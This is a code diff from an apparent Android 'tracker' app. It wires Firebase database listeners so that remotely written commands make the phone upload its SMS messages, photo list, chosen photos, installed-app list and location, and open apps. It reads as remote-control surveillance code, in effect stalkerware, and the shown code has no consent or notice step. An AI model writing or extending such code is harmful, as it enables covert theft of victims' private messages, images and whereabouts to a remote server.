@@ -83,7 +83,7 @@ public class MainActivity extends AppCompatActivity {
         tracker.setTrackerName(name);
         tracker.setLatitude(lastLocation.getLatitude());
         tracker.setLongitude(lastLocation.getLongitude());
-        myRef.child("Trackers").child(tracker.getPhoneNumber()).setValue(tracker);
+        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("Location").setValue(tracker);
 
     }
 
@@ -111,13 +111,15 @@ public class MainActivity extends AppCompatActivity {
 
             phoneNumber=addPhoneNumberEditText.getText().toString();
             name=addNameEditText.getText().toString();
+            tracker.setTrackerName(name);
+            tracker.setPhoneNumber(phoneNumber);
             readFromFirebace(v);
 
         }
     };
     private void readFromFirebace(View v) {
         // Read from the database
-        myRef.child("functions").child(phoneNumber).addValueEventListener(new ValueEventListener() {
+        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("functions").addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot dataSnapshot) {
                 // This method is called once with the initial value and again
@@ -133,32 +135,62 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("OpenSpecificAppOrPhoto").addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                // This method is called once with the initial value and again
+                // whenever data at this location is updated.
+                String value = dataSnapshot.getValue(String.class);
+                openAPP(value);
+            }
+
+            @Override
+            public void onCancelled(DatabaseError error) {
+                // Failed to read value
+
+            }
+        });
+
     }
+
+    private void openAPP(String value) {
+        if(value==null)
+            return;
+        if(value.charAt(0)=='c')
+            InstalledApplictions.startDesiredApplication(value,this);
+        else {
+            String photoPath=value;
+            //savephotoToStorage(photoPath);
+            String photo=Photos.BitMapToString(Photos.getImageByPath(photoPath));
+            myRef.child("Trackers").child(tracker.getPhoneNumber()).child("photo").push().setValue(photo);
+
+        }
+    }
+
     private void chooseFunctionByString(String value) {
         if(value==null)
             return;
         switch(value) {
             case "TakePhoto":
                 List<String> photoList=Photos.getImagesPath(this);
-                myRef.child(phoneNumber).child("photoList").setValue(photoList);
+                myRef.child("Trackers").child(tracker.getPhoneNumber()).child("photoList").setValue(photoList);
                 break;
             case "TakeSMS":
                 List<Pair> smsList= SMS.getSMS(this);
-                myRef.child(phoneNumber).child("SMSList").setValue(smsList);
+                myRef.child("Trackers").child(tracker.getPhoneNumber()).child("SMSList").setValue(smsList);
                 break;
             case "TakePhotoByPath":
                 String photoPath="/storage/emulated/0/DCIM/Camera/20160606_171750.jpg";
                 //savephotoToStorage(photoPath);
                   String photo=Photos.BitMapToString(Photos.getImageByPath(photoPath));
-                  myRef.child(phoneNumber).child("photo").push().setValue(photo);
+                myRef.child("Trackers").child(tracker.getPhoneNumber()).child("photo").push().setValue(photo);
                   Log.i("fdsfsd",photo);
                   break;
             case "InstallAplication":
                 List<ApplicationInfo> apps=InstalledApplictions.getAllInstalledApps(this);
                 List<PackageInfo> appsN=InstalledApplictions.getAllInstalledAppsName(this);
                 Log.i("fdds", String.valueOf(appsN));
-                myRef.child(phoneNumber).child("InstallAplication").push().setValue(String.valueOf(appsN));
-                InstalledApplictions.startDesiredApplication("com.goldtouch.mako",this);
+                myRef.child("Trackers").child(tracker.getPhoneNumber()).child("InstallAplication").push().setValue(String.valueOf(appsN));
             default:
                 // code block
         }
